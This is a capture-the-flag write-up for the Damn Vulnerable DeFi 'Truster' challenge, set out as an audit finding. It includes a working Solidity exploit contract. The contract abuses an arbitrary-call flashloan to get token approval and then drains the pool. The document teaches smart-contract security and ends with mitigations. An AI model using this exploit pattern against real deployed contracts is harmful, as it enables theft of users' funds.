# Damn Vulnerable DeFi V4 - Truster

## Table of Contents

1. [Introduction](#introduction)
2. [Scope](#scope)
3. [Notes](#notes)
4. [Analysis](#analysis)

## Introduction

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## Scope

[Repository](https://github.com/NikolayPIvanov/damn-vulnerable-defi-v4)

- src/truster/TrusterLenderPool.sol

## Notes

### Win Condition

- Recover all funds and deposit them into the recovery address
- Achieve this in a single transaction

### Key Takeaway

- Contract uses trusted OpenZeppelin utility contracts like Address
- Contract uses Damn Vulnerable Token (DVT)
- Compares the balance before transfer and after transfer in order to make sure there was a repayment.
- Uses normal transfer of ERC-20, could use `safeTransfer`
- Calls arbitrary function on a passed address without restrictions. This is a code smell and can be used to exploit the contract in most scenarios.
- To satisfy the win condition, we should create an attacker contract

## Analysis

### [H-1] Calling arbitrary function on a any passed address can give approval for all funds in the pool

#### Description

A malicious actor can construct calldata so that the `TrustLenderPool` can give an approval to any address to spend of the funds, thus allowing the actor to steal the funds.

This is done by calling the `functionCall` function on any passed address.

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    ...
    target.functionCall(data);
    ...
}
```

We can easily construct data that is calling the `ERC20::approve` function on the DVT and allowing us to spend the full balance.

[Likelihood] - High

#### Impact

This can easily be done and the impact is critical as all the funds are stolen from the pool.

#### Proof of Concepts

- src/truster/TrusterExploiter.sol

1. Create a `TrusterExploiter` contract with logic inside the constructor
2. Forge encoded data that is calling the `ERC20::approve` function allowing the exploiter contract address to spend all the tokens in the pool.
3. Take a flashloan for 0 DVT (finding on its own) in order to skip before and after check. The borrower is the exploiter contract and the target is the DVT token.
4. The Pool transfers 0 DVT to the attacker contract, then calls the DVT with approve to give the attacker the full allowance.
5. Afterwards the attacker transfers the funds to the recovery address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterExploiter {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        bytes memory data = abi.encodeWithSelector(_token.approve.selector, address(this), TOKENS_IN_POOL);

        _pool.flashLoan(0, address(this), address(_token), data);

        _token.transferFrom(address(_pool), _recovery, TOKENS_IN_POOL);
    }
}
```

#### Recommended mitigation

The intended use is to call the borrower contract to return the flashloan. Once simple mitigation would be to disallow to call the `token` as a target.

A more structured approach would be to implement ERC-3156 which includes
`IERC3156FlashBorrower` and `IERC3156FlashLender`.
This will allow to call only a designated function on a `IERC3156FlashBorrower` contract implementation.
